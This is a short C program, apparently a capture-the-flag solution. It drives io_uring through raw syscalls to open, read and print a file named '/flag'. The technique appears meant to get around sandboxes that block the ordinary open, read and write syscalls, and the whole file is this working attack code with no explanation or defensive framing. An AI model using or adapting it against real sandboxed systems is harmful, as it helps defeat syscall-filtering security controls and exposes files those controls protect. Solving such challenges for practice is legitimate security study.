#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <linux/io_uring.h>

static int ring_fd;
static struct io_uring_sqe *sqes;
static struct io_uring_cqe *cqes;

static uint32_t *sq_tail, *sq_head, *sq_mask, *sq_array;
static uint32_t *cq_tail, *cq_head, *cq_mask;

static inline int enter_syscall(int to_submit, int min_complete) {
    return syscall(__NR_io_uring_enter, ring_fd,
                   to_submit, min_complete,
                   IORING_ENTER_GETEVENTS, NULL, 0);
}

static void setup() {
    struct io_uring_params p = {0};
    ring_fd = syscall(__NR_io_uring_setup, 8, &p);
    if (ring_fd < 0) { perror("io_uring_setup"); _exit(1); }

    size_t sq_sz = p.sq_off.array + p.sq_entries * sizeof(uint32_t);
    size_t cq_sz = p.cq_off.cqes + p.cq_entries * sizeof(struct io_uring_cqe);

    void *sq_ptr = mmap(NULL, sq_sz, PROT_READ|PROT_WRITE,
                        MAP_SHARED|MAP_POPULATE, ring_fd, IORING_OFF_SQ_RING);
    void *cq_ptr = mmap(NULL, cq_sz, PROT_READ|PROT_WRITE,
                        MAP_SHARED|MAP_POPULATE, ring_fd, IORING_OFF_CQ_RING);

    sqes = mmap(NULL, p.sq_entries * sizeof(*sqes),
                PROT_READ|PROT_WRITE, MAP_SHARED|MAP_POPULATE,
                ring_fd, IORING_OFF_SQES);

    sq_head = (void*)sq_ptr + p.sq_off.head;
    sq_tail = (void*)sq_ptr + p.sq_off.tail;
    sq_mask = (void*)sq_ptr + p.sq_off.ring_mask;
    sq_array = (void*)sq_ptr + p.sq_off.array;

    cq_head = (void*)cq_ptr + p.cq_off.head;
    cq_tail = (void*)cq_ptr + p.cq_off.tail;
    cq_mask = (void*)cq_ptr + p.cq_off.ring_mask;
    cqes = (void*)cq_ptr + p.cq_off.cqes;
}

static int submit_sqe(struct io_uring_sqe *sqe) {
    uint32_t t = *sq_tail;
    uint32_t idx = t & *sq_mask;

    memcpy(&sqes[idx], sqe, sizeof(*sqe));
    sq_array[idx] = idx;
    *sq_tail = t + 1;

    if (enter_syscall(1, 1) < 0) { perror("enter"); _exit(1); }

    // Wait CQE
    while (*cq_head == *cq_tail) ;
    uint32_t cidx = *cq_head & *cq_mask;
    int res = cqes[cidx].res;
    (*cq_head)++;

    return res;
}

int main() {
    setup();

    char path[] = "/flag";
    char buf[4096];

    // OPENAT via io_uring
    struct io_uring_sqe sqe;
    memset(&sqe, 0, sizeof(sqe));

    sqe.opcode = IORING_OP_OPENAT;
    sqe.fd = AT_FDCWD;
    sqe.addr = (unsigned long)path;
    sqe.open_flags = O_RDONLY;

    int fd = submit_sqe(&sqe);
    if (fd < 0) {
        write(2, "open failed\n", 12);
        return 1;
    }

    // READ via io_uring
    memset(&sqe, 0, sizeof(sqe));
    sqe.opcode = IORING_OP_READ;
    sqe.fd = fd;
    sqe.addr = (unsigned long)buf;
    sqe.len = sizeof(buf);

    int r = submit_sqe(&sqe);
    if (r < 0) {
        write(2, "read failed\n", 12);
        return 1;
    }

    // WRITE stdout via io_uring
    memset(&sqe, 0, sizeof(sqe));
    sqe.opcode = IORING_OP_WRITE;
    sqe.fd = 1;
    sqe.addr = (unsigned long)buf;
    sqe.len = r;

    submit_sqe(&sqe);

    return 0;
}